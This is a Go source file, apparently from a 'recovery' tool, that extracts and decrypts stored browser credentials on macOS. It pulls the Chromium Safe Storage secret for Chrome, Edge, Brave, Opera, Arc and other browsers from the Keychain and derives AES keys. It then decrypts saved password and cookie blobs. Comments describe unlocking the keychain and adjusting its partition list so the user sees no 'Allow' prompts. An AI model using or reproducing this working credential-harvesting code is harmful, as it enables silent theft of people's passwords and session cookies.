//go:build darwin

// crypto_darwin.go — Chromium Safe Storage key derivation and blob decryption on macOS.
//
// Flow:
//  1. Read the browser's "Safe Storage" password from Keychain (security find-generic-password).
//  2. PBKDF2-HMAC-SHA1 (salt "saltysalt", 1003 iterations) → 16-byte AES key (v10).
//  3. Decrypt password/cookie blobs (AES-CBC/GCM prefixes used by Chrome).
//
// Account/service names for security(1) match Chromium's Keychain item layout;
// wrong -a/-s pairs cause empty secrets or extra Keychain prompts.
package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"

	"recovery/recovery/browser"
	"recovery/recovery/types"

	"golang.org/x/crypto/pbkdf2"
)

// Chromium macOS Keychain → AES key parameters (stable across Chrome family browsers).
const (
	darwinChromeSalt       = "saltysalt"
	darwinChromeIterations = 1003
	darwinChromeKeyLen     = 16
)

var chromeKeychainServices = map[string]string{
	"Chrome":        "Chrome Safe Storage",
	"Chrome Beta":   "Chrome Safe Storage",
	"Chrome Canary": "Chrome Safe Storage",
	"Chromium":      "Chromium Safe Storage",
	"Edge":          "Microsoft Edge Safe Storage",
	"Brave":         "Brave Safe Storage",
	"Vivaldi":       "Vivaldi Safe Storage",
	"Opera":         "Opera Safe Storage",
	"Opera GX":      "Opera Safe Storage",
	"Arc":           "Arc Safe Storage",
	"Yandex":        "Yandex Safe Storage",
}

func chromeKeychainService(browserName string) string {
	if service, ok := chromeKeychainServices[browserName]; ok {
		return service
	}
	return browserName + " Safe Storage"
}

func loginKeychainPath() string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		if u, err := user.Current(); err == nil {
			home = u.HomeDir
		}
	}
	if home == "" {
		return ""
	}
	return filepath.Join(home, "Library", "Keychains", "login.keychain-db")
}

func keychainAccountsForBrowser(browserName string) []string {
	switch browserName {
	case "Chrome", "Chrome Beta", "Chrome Canary":
		return []string{"Chrome"}
	case "Brave":
		return []string{"Brave"}
	case "Chromium":
		return []string{"Chromium"}
	case "Edge":
		return []string{"Microsoft Edge", "Edge"}
	case "Opera", "Opera GX":
		return []string{"Opera", "Opera GX"}
	case "Vivaldi":
		return []string{"Vivaldi"}
	case "Arc":
		return []string{"Arc"}
	default:
		return []string{browserName}
	}
}

// getKeychainPassword reads Chromium Safe Storage secret from macOS Keychain.
//
// After EnsureLoginKeychainUnlocked + set-key-partition-list, this should not open
// system Keychain Allow dialogs. We use minimal lookups (no multi-style spam) so a
// failed path does not trigger several GUI prompts.
func getKeychainPassword(browserName string) (string, error) {
	_ = EnsureLoginKeychainUnlocked()

	service := chromeKeychainService(browserName)
	if cached, ok := cachedSafeStorageSecret(service); ok {
		return cached, nil
	}

	// Ensure ACL for this service even if the broad genp pass missed it.
	ensureServicePartitionList(service)

	accounts := keychainAccountsForBrowser(browserName)
	var lastErr error

	// 1) Preferred: service + account (matches Chromium item layout; fewest prompts).
	for _, account := range accounts {
		password, err := RunSecurityStdout("find-generic-password", "-s", service, "-a", account, "-w")
		if err != nil {
			lastErr = err
			continue
		}
		if password != "" {
			cacheSafeStorageSecret(service, password)
			logf("keychain OK for %s via service+account (%s)", browserName, account)
			return password, nil
		}
	}

	// 2) Service only (some profiles omit a stable account string).
	password, err := RunSecurityStdout("find-generic-password", "-s", service, "-w")
	if err == nil && password != "" {
		cacheSafeStorageSecret(service, password)
		logf("keychain OK for %s via service-only", browserName)
		return password, nil
	}
	if err != nil {
		lastErr = err
	}

	// 3) Last resort: account -w (classic layout). Only primary account to limit prompts.
	if len(accounts) > 0 {
		password, err = RunSecurityStdout("find-generic-password", "-wa", accounts[0])
		if err == nil && password != "" {
			cacheSafeStorageSecret(service, password)
			logf("keychain OK for %s via -wa %s", browserName, accounts[0])
			return password, nil
		}
		if err != nil {
			lastErr = err
		}
	}

	if lastErr == nil {
		lastErr = fmt.Errorf("empty keychain password")
	}
	return "", fmt.Errorf("keychain lookup failed for %s (%s): %w", browserName, service, lastErr)
}

func securityArgsContain(args []string, value string) bool {
	for _, a := range args {
		if a == value {
			return true
		}
	}
	return false
}

func deriveChromeV10Key(password string) []byte {
	return pbkdf2.Key([]byte(password), []byte(darwinChromeSalt), darwinChromeIterations, darwinChromeKeyLen, sha1.New)
}

func decryptLocalStateEncryptedKey(keychainPassword, encKeyB64 string) []byte {
	if encKeyB64 == "" {
		return nil
	}
	raw, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil || len(raw) < 4 {
		return nil
	}
	if string(raw[:3]) != "v10" {
		return nil
	}
	key := deriveChromeV10Key(keychainPassword)
	plain, err := aesCBCDecrypt(key, raw[3:])
	if err != nil || len(plain) == 0 {
		return nil
	}
	return plain
}

func ResolveKeys(cfg types.BrowserConfig) (*types.ResolvedKeys, error) {
	if cfg.IsFirefox {
		return &types.ResolvedKeys{}, nil
	}

	password, err := getKeychainPassword(cfg.Name)
	if err != nil {
		return nil, fmt.Errorf("could not get keychain password for %s: %w", cfg.Name, err)
	}

	keys := &types.ResolvedKeys{
		V10: deriveChromeV10Key(password),
	}

	localStatePath := browser.LocalStatePath(cfg)
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return keys, nil
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return keys, nil
	}

	osCrypt, _ := localState["os_crypt"].(map[string]interface{})
	if osCrypt == nil {
		return keys, nil
	}

	if encKey, ok := osCrypt["encrypted_key"].(string); ok {
		if master := decryptLocalStateEncryptedKey(password, encKey); len(master) > 0 {
			keys.V10 = master
			logf("resolved %s master key from Local State encrypted_key (%d bytes)", cfg.Name, len(master))
		}
	}

	return keys, nil
}

func DecryptChromiumBlob(encrypted []byte, v10Key, v20Key []byte) string {
	if len(encrypted) == 0 {
		return ""
	}
	if len(encrypted) < 3 {
		return ""
	}

	prefix := string(encrypted[:3])
	switch prefix {
	case "v10", "v11":
		if plain := decryptDarwinV10CBC(encrypted, v10Key); plain != "" {
			return plain
		}
		return decryptDarwinGCM(encrypted, v10Key)
	case "v20":
		return decryptDarwinGCM(encrypted, v20Key)
	default:
		return ""
	}
}

func decryptDarwinV10CBC(encrypted, key []byte) string {
	if key == nil || len(key) == 0 {
		return ""
	}
	ciphertext := encrypted[3:]
	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
		return ""
	}
	plaintext, err := aesCBCDecrypt(key, ciphertext)
	if err != nil {
		return ""
	}
	return CleanPassword(plaintext)
}

func decryptDarwinGCM(encrypted, key []byte) string {
	if key == nil || len(key) == 0 || len(encrypted) < 3+12+16 {
		return ""
	}
	nonce := encrypted[3:15]
	tag := encrypted[len(encrypted)-16:]
	ciphertext := encrypted[15 : len(encrypted)-16]
	plaintext, err := aesGCMDecrypt(key, nonce, ciphertext, tag)
	if err != nil {
		return ""
	}
	return CleanPassword(plaintext)
}

func aesCBCDecrypt(key, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	iv := make([]byte, aes.BlockSize)
	for i := range iv {
		iv[i] = 0x20
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	plaintext = pkcs5Unpad(plaintext)
	if plaintext == nil {
		return nil, fmt.Errorf("invalid padding")
	}
	return plaintext, nil
}

func aesGCMDecrypt(key, nonce, ciphertext, tag []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ctWithTag := make([]byte, len(ciphertext)+len(tag))
	copy(ctWithTag, ciphertext)
	copy(ctWithTag[len(ciphertext):], tag)
	return aesGCM.Open(nil, nonce, ctWithTag, nil)
}

func pkcs5Unpad(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}
	padLen := int(data[len(data)-1])
	if padLen == 0 || padLen > aes.BlockSize || padLen > len(data) {
		return nil
	}
	for i := len(data) - padLen; i < len(data); i++ {
		if data[i] != byte(padLen) {
			return nil
		}
	}
	return data[:len(data)-padLen]
}

func CryptUnprotectData(in []byte) ([]byte, error) {
	return nil, fmt.Errorf("DPAPI not available on macOS")
}